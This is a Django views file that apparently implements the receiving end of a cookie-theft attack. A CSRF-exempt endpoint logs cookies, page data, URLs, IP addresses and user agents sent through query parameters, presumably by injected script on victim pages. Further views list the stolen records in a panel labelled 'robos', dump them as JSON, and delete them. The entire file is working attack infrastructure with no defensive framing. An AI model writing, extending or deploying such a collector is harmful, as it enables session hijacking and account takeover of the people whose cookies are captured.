from django.shortcuts import render
from django.http import HttpResponse, JsonResponse
from django.views.decorators.csrf import csrf_exempt  
from django.db import models
from .models import DatasAx
import json


@csrf_exempt 
def rcb_stl(request):
    if request.method == 'GET':
       
        cookie = request.GET.get('cookie', 'No se envio cookie')
        data = request.GET.get('data', 'No se envió data')
        url_complete = request.GET.get('url', 'No se envió URL')
        
        
        rb = DatasAx.objects.create(
            ip=request.META.get('REMOTE_ADDR'),
            user_agent=request.META.get('HTTP_USER_AGENT', 'No especificado'),
            cookie=cookie,
            data=data,
            url_complete=url_complete
        )
        
       
        print('=' * 60)
        print('Taken')
        print(f' Date: {rb.fecha}')
        print(f' IP: {rb.ip}')
        print(f' User-Agent: {rb.user_agent}')
        print(f' Cookie: {rb.cookie[:200]}...' if len(rb.cookie) > 200 else f' Cookie: {rb.cookie}')
        print(f' Data: {rb.data[:200]}...' if len(rb.data) > 200 else f' Data: {rb.data}')
        print(f' URL: {rb.url_complete}')
        print('=' * 60)
        print(f'Total: {DatasAx.objects.count()}')
        print('')
        
        
        return HttpResponse('OK')
    
    return HttpResponse('Wrong Method', status=405)


def panel_h(request):
    
    stl = DatasAx.objects.all()
    
    context = {
        'robos': stl,
        'total': stl.count(),
    }
    
    return render(request, 'pnl.html', context)

def index(request):
    total = DatasAx.objects.count()
    last_stl = DatasAx.objects.first()
    
    context = {
        'total': total,
        'last_stl': last_stl,
    }
    
    return render(request, 'index.html', context)

def cln(request):
    if request.method == 'POST':
        DatasAx.objects.all().delete()
        return JsonResponse({'status': 'ok', 'message': 'Datos eliminados'})
    return HttpResponse('Wrong method', status=405)


def api_stl(request):
    stls = DatasAx.objects.all().values()
    return JsonResponse(list(stls), safe=False)